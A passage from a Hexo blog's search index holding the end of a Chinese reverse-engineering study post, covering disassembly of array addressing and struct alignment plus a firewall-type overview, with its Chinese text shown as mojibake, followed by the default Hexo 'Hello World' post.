class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;k);<br><br>    Ary[i][j][k] = <span class="hljs-number">9</span>;  <span class="hljs-comment">//ä¼šäº§ç”Ÿæ•°ç»„å¯»å€å…¬å¼</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_7C          = dword ptr <span class="hljs-number">-7</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_78          = dword ptr <span class="hljs-number">-78</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_74          = dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_70          = dword ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000401552</span>                 sub     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">0000000000401559</span>                 lea     rbp, [rsp+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">0000000000401561</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_0], ecx<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_8], rdx<br>.text:<span class="hljs-number">0000000000401568</span>                 call    __main<br>.text:<span class="hljs-number">000000000040156</span>D                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_70] <br>.text:<span class="hljs-number">0000000000401571</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401576</span>                 mov     ecx, <span class="hljs-number">0</span>Ch<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     rdi, rdx<br>.text:<span class="hljs-number">000000000040157</span>E                 rep stosq<br>.text:<span class="hljs-number">0000000000401581</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_74], <span class="hljs-number">0</span>  <br>.text:<span class="hljs-number">0000000000401588</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_78], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040158F</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_7C], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401596</span>                 lea     rcx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">000000000040159</span>A                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">000000000040159</span>E                 lea     rax, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015</span>A2                 mov     r9, rcx<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     r8, rdx<br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     rdx, rax<br>.text:<span class="hljs-number">00000000004015</span>AB                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d%d%d&quot;</span>  <span class="hljs-comment">//è¯»å–ä¸‰ç»´æ•°ç»„</span><br>.text:<span class="hljs-number">00000000004015B</span>2                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">00000000004015B</span>7                 mov     edx, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015B</span>A                 mov     eax, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">00000000004015B</span>D                 mov     ecx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">00000000004015</span>C0                 movsxd  rcx, ecx<br>.text:<span class="hljs-number">00000000004015</span>C3                 movsxd  rdx, edx<br>.text:<span class="hljs-number">00000000004015</span>C6                 movsxd  r8, eax<br>.text:<span class="hljs-number">00000000004015</span>C9                 mov     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>CC                 add     rax, rax<br>.text:<span class="hljs-number">00000000004015</span>CF                 add     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>D2                 add     rax, r8<br>.text:<span class="hljs-number">00000000004015</span>D5                 shl     rax, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>D9                 add     rax, rcx<br>.text:<span class="hljs-number">00000000004015</span>DC                 mov     [rbp+rax*<span class="hljs-number">4</span>+<span class="hljs-number">20</span>h+var_70], <span class="hljs-number">9</span><br>.text:<span class="hljs-number">00000000004015E4</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015E9</span>                 add     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">00000000004015F</span>0                 pop     rdi<br>.text:<span class="hljs-number">00000000004015F</span>1                 pop     rbp<br>.text:<span class="hljs-number">00000000004015F</span>2                 retn<br>.text:<span class="hljs-number">00000000004015F</span>2 main            endp<br></code></pre></td></tr></table></figure><p>å…¬å¼å…ˆè´´å‡ºæ¥:</p><p>ã€€ã€€<strong>Ary + sizeof(type[C][H]) * i + sizeof(type[H])*j + sizeof(type)*k</strong></p><p> ä»£å…¥å…¬å¼çœ‹æ±‡ç¼–</p><p>ã€€ã€€1.eax = içš„å€¼</p><p>  ã€€ã€€2. eax * 30 ,ç›¸å½“äºæ±‚ sizeof(type[C][H]) * i</p><p>ã€€ã€€3.æ±‚å‡ºæ•°ç»„é¦–åœ°å€+eax,ä¹Ÿå°±æ˜¯æ±‚å‡ºäº† Ary[M]çš„ä½ç½®,ç»™Ecxèµ‹å€¼</p><p>ã€€ã€€4.æ±‚å‡ºjçš„å€¼</p><p>ã€€ã€€5.å·¦ç§»4ä½,ç›¸å½“äº2^4æ¬¡æ–¹ä¹Ÿå°±æ˜¯16 è¿™ä¸€æ­¥ç›¸å½“äºæ±‚ sizeof(type[H])çš„å€¼</p><p>ã€€ã€€6.ary[M] + sizeof(type[H])çš„å€¼å¾—å‡ºäº† ary[M][C]çš„å€¼</p><p>ã€€ã€€7.æ±‚å‡ºkçš„å€¼</p><p>ã€€ã€€8.æ•°ç»„å¯»å€å…¬å¼ ary[M][C]çš„å€¼ + 4 * kçš„å€¼.</p><h2 id="ç»“æ„ä½“"><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> ch;<br>    <span class="hljs-keyword">int</span>  number1;<br>    <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> number2;<br>    <span class="hljs-keyword">double</span> dbl;<br>    <span class="hljs-keyword">float</span> flt;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span> <span class="hljs-title">t1</span>=</span>&#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3.14</span>,<br>    <span class="hljs-number">0.0</span>    <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-keyword">sizeof</span>(t1));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”åæ±‡ç¼–</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: __tmainCRTStartup+242â†‘p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                                         <span class="hljs-comment">; DATA XREF: .pdata:000000000040506Câ†“o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_20          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">20h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_1C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">1Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_18          = <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_10          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_8           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401551</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401554</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401558</span>                 <span class="hljs-keyword">call</span>    __main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040155D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-number">61h</span> <span class="hljs-comment">; &#x27;a&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401561</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_1C], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401568</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_18], <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>000000000040156E                 <span class="hljs-keyword">movsd</span>   <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:qword_404008<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401576</span>                 <span class="hljs-keyword">movsd</span>   [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157B                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157F                 <span class="hljs-keyword">movss</span>   [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401584</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">20h</span> <span class="hljs-comment">; &#x27; &#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401589</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, Format     <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401590</span>                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401595</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040159A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span>000000000040159E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040159F                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040159F main            endp<br></code></pre></td></tr></table></figure><p>â€‹    ç¼–è¯‘å™¨å¯¹é½å€¼,è®¾ç½®ä¸º alg, MeMber offset ä»0å¼€å§‹è®¡ç®—, å…¶ä¸­Member offset è¦æ¯æ¬¡ä»£å…¥å…¬å¼ä¹‹å,åŠ ä¸Šè‡ªå·±æˆå‘˜æ‰€å çš„å­—èŠ‚å¤§å°,ç»§ç»­å‚ä¸ä¸‹æ¬¡è¿ç®—</p><p>ã€€ã€€ç»“æ„ä½“æˆå‘˜åç§»è®¡ç®—å…¬å¼:  MeMber offset % min(alg,sizeof(Member type)) == 0</p><p>ã€€ã€€ç»“æ„ä½“æ€»å¤§å°è®¡ç®—å…¬å¼: ã€€ sizeof(struct) % min(Max type size,alg) == 0;</p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><p>â€‹    ï¼ˆå¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶ï¼‰ lea ecx, [xxx]<br>â€‹    (æˆå‘˜å‡½æ•°ä¸­) mov xxxï¼Œecx ; ç›´æ¥å°±ä½¿ç”¨äº†ecx call æˆå‘˜å‡½æ•° stdcallå’Œcdecæ–¹å¼éƒ½æ˜¯pushä¼ å‚ï¼ˆæœ€åä¸€ä¸ªPUSHï¼‰<br>â€‹    lea reg, å¯„å­˜å™¨é¦–åœ°å€ push reg call æˆå‘˜å‡½æ•°<br>â€‹    å½“ç»™å‡½æ•°ä¼ å‚æ—¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥æ€€ç–‘è¿™ä¸ªæ˜¯ç±»å¯¹è±¡çš„æˆå‘˜å‡½æ•° å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’<br>â€‹    æˆå‘˜ç®€å•ï¼šç›´æ¥å½“ä½œå˜é‡å‹æ ˆï¼Œå…ˆå®šä¹‰çš„æˆå‘˜åå‹æ ˆï¼Œåå®šä¹‰çš„æˆå‘˜å…ˆå‹æ ˆï¼ˆä¿è¯åœ¨æ ˆä¸­çš„ é¡ºåºå’Œå®šä¹‰æ—¶ä¸€æ ·ï¼‰<br>â€‹    æˆå‘˜å¤æ‚ï¼šå°†æ•´ä¸ªå¯¹è±¡å¤åˆ¶åˆ°æ ˆé¡¶ï¼ˆç›¸å½“äºæ•´ä¸ªå‹æ ˆï¼‰ï¼Œå…·ä½“æ“ä½œ<br>â€‹    sub esp, ç±»å¯¹è±¡é•¿åº¦ ; é¢„å…ˆç”³è¯·æ ˆç©ºé—´ï¼Œç”¨äºå­˜å‚¨ç±»å¯¹è±¡çš„å½¢å‚ mov ecx, 10<br>â€‹    ;è®¾ç½®å¾ªç¯æ¬¡æ•°10æ¬¡<br>â€‹    rep movs æ ˆé¡¶ï¼Œå¯¹è±¡åœ°å€ ;å°±æ˜¯ç±»ä¼¼memcpyï¼Œå°†å†…å®¹æ•´ä½“æ‹·è´åˆ°æ ˆé¡¶ï¼ˆåˆšåˆšå¼€è¾Ÿçš„ä½ç½®ï¼‰ call funâ€¦<br>â€‹    å¯¹è±¡ä½œä¸ºè¿”å›å€¼ è°ƒç”¨å‰ä¼šå°†å¯¹è±¡è¿”å›çš„ä½ç½®ä½œä¸ºå‚æ•°å‹æ ˆï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨æ–¹å‡†å¤‡å¥½ç©ºé—´ï¼Œå‘Šè¯‰å­å‡½æ•°åœ°å€ï¼Œåˆ°<br>æ—¶å€™å­å‡½æ•°è¿”å›çš„è¿‡ç¨‹å°±æ˜¯ç›´æ¥å†™è¿›é‚£ä¸ªåœ°å€ï¼‰</p><p>â€‹    ç©ºç±»çš„å®ä¾‹å ç”¨1å­—èŠ‚ï¼šç›®çš„æ˜¯ä¸ºäº†èƒ½å¤Ÿè·å–åˆ°è¯¥å®ä¾‹çš„åœ°å€ å¯¹è±¡ä¸­å…ˆå®šä¹‰çš„å˜é‡åœ¨ä½åœ°å€å¤„ï¼Œåå®šä¹‰çš„å˜é‡åœ¨é«˜åœ°å€å¤„ï¼ˆç±»ä¼¼æ•°ç»„ï¼‰ å†…å­˜å¯¹é½ï¼š<br>â€‹    æ¯ä¸ªæ•°æ®å­˜æ”¾çš„åœ°å€å¿…é¡»æ˜¯è‡ªèº«é•¿åº¦çš„æ•´æ•°å€ 2ç»“æ„ä½“æ€»é•¿åº¦å¿…é¡»æ˜¯æ•°æ®ä¸­æœ€é•¿ç±»å‹é•¿åº¦çš„æ•´æ•°å€ å¦‚æœæŒ‡å®šäº†#pragma pack(n)ï¼Œåˆ™åŸå€¼å’Œnå–min ç¼–è¯‘å™¨ç”¨0xCCå¡«å……<br>â€‹    ç±»ä¸­é™æ€å˜é‡ï¼šæ˜¯å…·æœ‰ä½œç”¨åŸŸçš„å…¨å±€å˜é‡ï¼ˆåŒé™æ€å˜é‡ï¼‰ æ‰€ä»¥é™æ€æˆå‘˜å˜é‡å¯ä»¥ç”Ÿæˆå¯¹è±¡å°±ä½¿ç”¨ï¼ˆç”¨ç±»è®¿é—®ï¼‰ ä¹Ÿæ— éœ€thisæŒ‡é’ˆ<br>â€‹    thisæŒ‡é’ˆï¼šåœ¨å¯¹è±¡è°ƒç”¨è‡ªå·±çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šMOV ecx, å¯¹è±¡é¦–åœ°å€ï¼Œè€Œè¿›å…¥æˆå‘˜å‡½æ•°æ—¶ä¼šè‡ªåŠ¨å°† ecxå…¥æ ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®é™…ä¸Šå‡½æ•°å¤šäº†ä¸€ä¸ªå‚æ•°ï¼Œæ˜¯æŒ‡å‘è‡ªå·±å¯¹è±¡é¦–åœ°å€çš„æŒ‡é’ˆï¼Œè¿™å°±æ˜¯thisæŒ‡ é’ˆã€‚<br>â€‹    thiscallæ–¹å¼ç‰¹ç‚¹ï¼šä½¿ç”¨ecxä¼ thisæŒ‡é’ˆ</p><h2 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h2><p>â€‹    ä»€ä¹ˆæ˜¯é˜²ç«å¢™ â€“ ä¸€ç§é«˜çº§è®¿é—®æ§åˆ¶è®¾å¤‡ï¼Œç½®äº<strong>ä¸åŒç½‘ç»œå®‰å…¨åŸŸ ä¹‹é—´çš„ä¸€ç³»åˆ—éƒ¨ä»¶çš„ç»„åˆ</strong>ï¼Œå®ƒæ˜¯<strong>ä¸åŒç½‘ç»œå®‰å…¨ åŸŸé—´é€šä¿¡æµçš„å”¯ä¸€é€šé“</strong>ï¼Œèƒ½æ ¹æ®ä¼ä¸šæœ‰å…³çš„å®‰å…¨æ”¿ç­–æ§åˆ¶ï¼ˆå…è®¸ã€æ‹’ç»ã€ç›‘è§†ã€è®°å½•ï¼‰è¿›å‡ºç½‘ç»œçš„è®¿é—®è¡Œä¸ºã€‚</p><p>1.ç®€å•åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼šï¼ˆç»¼åˆå®‰å…¨æ€§æœ€å·®ï¼‰ </p><p>â‘  ç®€å•åŒ…è¿‡æ»¤é˜²ç«å¢™ä¸æ£€æŸ¥æ•°æ®åŒº â‘¡ ç®€å•åŒ…è¿‡æ»¤é˜²ç«å¢™ä¸å»ºç«‹è¿æ¥çŠ¶æ€è¡¨ â‘¢ å‰åæŠ¥æ–‡æ— å…³ â‘£ åº”ç”¨å±‚æ§åˆ¶å¾ˆå¼± â‘¤ å¤„ç†å¯¹è±¡ï¼šå•ä¸ªåŒ…æŠ¥å¤´</p><p>2.çŠ¶æ€æ£€æµ‹åŒ…è¿‡æ»¤é˜²ç«å¢™ </p><p>â‘  ä¸æ£€æŸ¥æ•°æ®åŒº â‘¡ å»ºç«‹è¿æ¥çŠ¶æ€è¡¨ â‘¢ å‰åæŠ¥æ–‡ç›¸å…³ â‘£ åº”ç”¨å±‚æ§åˆ¶å¾ˆå¼± â‘¤ å¤„ç†å¯¹è±¡ï¼šå•ä¸ªåŒ…æŠ¥å¤´</p><p>3.åº”ç”¨ä»£ç†é˜²ç«å¢™</p><p>åªæ£€æŸ¥æ•°æ®ï¼Œä¸æŸ¥ipï¼ŒtcpæŠ¥å¤´ï¼Œä¸å»ºç«‹è¿æ¥è¡¨ï¼Œç½‘ç»œå±‚ä¿æŠ¤è¾ƒå¼±ï¼Œå¤„ç†æ•°æ®åŒ…</p><p>4.æ ¸æ£€æµ‹é˜²ç«å¢™ï¼ˆç»¼åˆå®‰å…¨æ€§æœ€å¥½ï¼‰ </p><p>æ£€æŸ¥å¤šä¸ªæŠ¥æ–‡çš„ä¼šè¯ï¼Œåè®®è¿˜åŸï¼Œä¸Šä¸‹æ–‡ç›¸å…³ï¼Œå¤„ç†ä¸€æ¬¡å¯¹è¯</p><p>è½¯ä»¶é˜²ç«å¢™ï¼šä¿æŠ¤æ•´ä¸ªç½‘ç»œ å•æœºé˜²ç«å¢™ï¼šä¿æŠ¤æ¾¹å°ä¸»æœº</p><p>é˜²ç«å¢™çš„å…¶ä»–åŠŸèƒ½ï¼š èº«ä»½è®¤è¯ï¼›å®¡è®¡ã€æ—¥å¿—åˆ†æï¼›å¸¦å®½ç®¡ç†ï¼›è´Ÿè½½å‡è¡¡ï¼›ä¸ IDS è”åŠ¨ï¼›ä¸ç—…æ¯’ç½‘å…³è”åŠ¨ï¼›ä¸URL æœåŠ¡<br>å™¨è”åŠ¨ï¼›Mac ç»‘å®šï¼›Map æ˜ å°„â€¦</p>]]></content>
    
    
    <categories>
      
      <category>é€†å‘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/01/07/hello-world/"/>
    <url>/2022/01/07/hello-world/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
